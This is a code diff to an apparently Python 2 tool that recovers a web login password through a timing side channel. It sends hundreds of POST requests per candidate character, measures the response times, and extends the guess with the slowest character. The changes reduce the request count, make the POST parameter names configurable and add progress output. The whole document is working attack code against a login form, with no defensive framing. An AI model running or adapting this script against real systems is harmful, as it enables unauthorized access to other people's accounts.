@@ -21,7 +21,11 @@ CHARSET = 'abcde'
 FAILLOGINMESSAGE = 'Invalid username/password combination'
 
 # set to be the number of requests to set to the server for every character
-NUMREQUESTS = 500
+NUMREQUESTS = 250
+
+# POST parameter variable names
+USERNAMEPOSTPARAM = 'username'
+PASSWORDPOSTPARAM = 'password'
 
 def makerequest(guess):
     '''
@@ -36,6 +40,7 @@ def makerequest(guess):
     chartimes = {}
     chartimeavg = {}
 
+
     # for every character in the characterset, make a request
     for c in CHARSET:
         newguess = guess + c
@@ -44,7 +49,7 @@ def makerequest(guess):
         chartimes[c] = 0.0
 
         print "Sending " + str(NUMREQUESTS) + " requests to the server for the password '" + newguess + "'"
-        parameters = {'username': USERNAME, 'password': newguess}
+        parameters = {USERNAMEPOSTPARAM: USERNAME, PASSWORDPOSTPARAM: newguess}
         for i in range(0,NUMREQUESTS):
             start = time.time()
             # make request
@@ -98,6 +103,11 @@ def getaverage(chartimes):
 
 if __name__ == '__main__':
     temppass = ''
+
+    print "Attempting to login into " + URL + " as user '" + USERNAME + "'"
+    print "Character set is: " + CHARSET
+    print "Failed login message is: 'Invalid username/password combination'"
+    print "----------------------------------------------------------------\n"
 
     while True:
         temppass = makerequest(temppass)
